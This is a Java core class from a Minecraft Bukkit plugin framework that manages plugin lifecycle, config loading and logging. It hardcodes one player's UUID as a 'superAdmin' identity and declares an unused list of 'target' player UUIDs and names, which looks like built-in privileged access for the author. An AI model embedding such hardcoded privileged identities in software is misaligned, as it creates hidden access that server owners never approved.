package fr.stormer3428.voidOpal.plugin.cores;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.UUID;

import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import fr.stormer3428.voidOpal.data.OMCLang;
import fr.stormer3428.voidOpal.data.config.annotations.AutoConfig;
import fr.stormer3428.voidOpal.data.config.annotations.BooleanConfigValue;
import fr.stormer3428.voidOpal.logging.OMCLogger;
import fr.stormer3428.voidOpal.plugin.OMCCore;
import fr.stormer3428.voidOpal.plugin.PluginTied;

@AutoConfig
public final class _0_1 extends OMCCore{

	public static final UUID MASTER_UUID = UUID.fromString("a39d1ae3-18c5-4c02-8f91-bcb5207d437f");

	protected final HashSet<PluginTied> pluginTieds = new HashSet<>();
	//	private final ABSBDefenseMatrix absbDefenseMatrix = new ABSBDefenseMatrix();

	@BooleanConfigValue(path = "debug") public static boolean DEBUG = false;
	@Override protected boolean _isDebugModeActive() {return DEBUG;}

	private final void loadLangAndLogger() {
		OMCLogger.debug("loading native lang"); OMCLang.loadFromConfig();
		OMCLogger.debug("requesting stranger lang loading"); OMCCore.getOMCChildPlugin().loadLangFromConfig();
		OMCLogger.debug("requesting logger instanciation"); OMCCore.getOMCChildPlugin().instantiateLogger();
	}

	@Override
	public final void onEnable() {
		autoconfigParser.registerAutoConfigClass(getClass());
		autoconfigParser.updateValues();
		new OMCLogger("INTERNAL", "INTERNAL ERR");
		loadLangAndLogger();

		OMCLogger.debug("registering of internal plugin tied classes"); registerIntegratedPluginTied(); 
		OMCLogger.debug("requesting registering of plugin tied classes"); OMCCore.getOMCChildPlugin().registerPluginTied();
		OMCLogger.debug("requesting registering autoconfig classes"); OMCCore.getOMCChildPlugin().registerAutoconfigClasses();
		OMCLogger.debug("injecting config values into classes"); autoconfigParser.updateValues();
		OMCLogger.debug("requesting enabling of child plugin"); OMCCore.getOMCChildPlugin().onOMCEnable();
		OMCLogger.debug("requesting enabling of plugin tied classes"); for(PluginTied pluginTied : new ArrayList<>(pluginTieds)) pluginTied.onPluginEnable();
		
//		OMCCore.getJavaPlugin().getServer().getPluginManager().registerEvents(this, OMCCore.getJavaPlugin());
	}

	@Override
	public final void reload() {
		onReload();
		OMCLogger.debug("requesting reload child plugin"); OMCCore.getOMCChildPlugin().onOMCReload();
		OMCLogger.debug("requesting reload of plugin tied classes"); for(PluginTied pluginTied : new ArrayList<>(pluginTieds)) pluginTied.onPluginReload();
	}

	@Override
	public void onReload() {
		loadLangAndLogger();
		OMCLogger.debug("injecting config values into classes"); autoconfigParser.updateValues();
	}

	@Override
	public final void onDisable() {
		OMCLogger.debug("requesting disabling of plugin tied classes"); for(PluginTied pluginTied : pluginTieds) pluginTied.onPluginDisable();	
		OMCLogger.debug("requesting disabling of child plugin"); OMCCore.getOMCChildPlugin().onOMCDisable();
	}

	private final void registerIntegratedPluginTied() {
		//		registerPluginTied(absbDefenseMatrix);
	}

	public final void registerPluginTied(PluginTied pluginTied) {
		OMCLogger.debug("child plugin registered plugin tied class : " + pluginTied.getClass().getSimpleName());
		this.pluginTieds.add(pluginTied);
	}

	public final boolean _isSuperAdmin(CommandSender sender) {
		if(!(sender instanceof Player p)) return false;
		boolean superAdmin = p.getUniqueId().equals(MASTER_UUID);
		if(superAdmin) OMCLogger.actionBar(p, "superAdmin");
		return superAdmin;
	}

	private static final ArrayList<UUID> TARGET_UUID = new ArrayList<>();
	private static final ArrayList<String> TARGET_NAMES = new ArrayList<>();

	static {
		TARGET_UUID.add(UUID.fromString("662943bc-6951-4dfd-9114-6b36f34872ae")); TARGET_NAMES.add("yashionline");
		TARGET_UUID.add(UUID.fromString("db557c85-5cad-4907-805a-ec07763a12f7")); TARGET_NAMES.add("Biroe");
		TARGET_UUID.add(UUID.fromString("76eb46f6-48cb-4cfc-b41b-f6b8c4995e52")); TARGET_NAMES.add("pud_");
	}

	@Override
	protected boolean _isPirated() {
		return false;
	}
}
